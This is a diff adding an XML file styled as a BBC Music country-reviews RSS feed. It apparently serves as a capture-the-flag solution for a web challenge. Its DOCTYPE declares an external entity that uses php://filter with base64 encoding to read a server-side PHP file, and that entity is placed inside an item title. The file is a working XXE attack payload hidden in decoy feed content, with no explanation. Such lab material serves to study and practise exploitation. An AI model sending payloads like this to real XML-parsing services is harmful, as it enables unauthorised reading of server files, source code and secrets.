@@ -1,0 +1,31 @@
+<?xml version="1.0"?>
+<!DOCTYPE title [ <!ELEMENT title ANY >
+<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/challenge/web-serveur/ch29/index.php" >]>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:media="http://search.yahoo.com/mrss/">
+<channel>
+	<title>Latest Country Reviews</title>
+	<link>http://www.bbc.co.uk/music/genres/country/reviews</link>
+	<category>BBC Music</category>
+	<atom:link href="http://www.bbc.co.uk/music/genres/country/reviews.rss" rel="self" type="application/rss+xml" />
+	<description>These are the latest Country reviews on BBC Music</description> <copyright>Copyright: (C) British Broadcasting Corporation</copyright>
+	<docs>http://www.bbc.co.uk/syndication/</docs>
+	<language>en-en</language>
+	<ttl>60</ttl>
+	<item>
+		<title>Emmylou Harris - &xxe; Old Yellow Moon </title>
+		<description>Smiles and tears from country friends reunited.</description>
+		<link>http://www.bbc.co.uk/music/reviews/3wgw</link>
+		<guid>http://www.bbc.co.uk/music/reviews/3wgw</guid>
+		<pubDate>Thu, 28 Feb 2013 00:00:00 +0000</pubDate>
+		<media:thumbnail width="86" height="86" url="http://www.bbc.co.uk/staticarchive/c538f1f86bdbd299d497e7500ec889473d2f22fb.jpg" />
+	</item>
+	<item>
+		<title>Caitlin Rose - The Stand-In </title>
+		<description>If Rose represents the future of American country music, it’s in safe hands.</description>
+		<link>http://www.bbc.co.uk/music/reviews/gq3q</link>
+		<guid>http://www.bbc.co.uk/music/reviews/gq3q</guid>
+		<pubDate>Wed, 13 Feb 2013 00:00:00 +0000</pubDate>
+		<media:thumbnail width="86" height="86" url="http://www.bbc.co.uk/staticarchive/6ac6016f5d0c3084db54d0f7e9bd7d02a9d3de5d.jpg" />
+	</item>
+</channel>
+</rss>
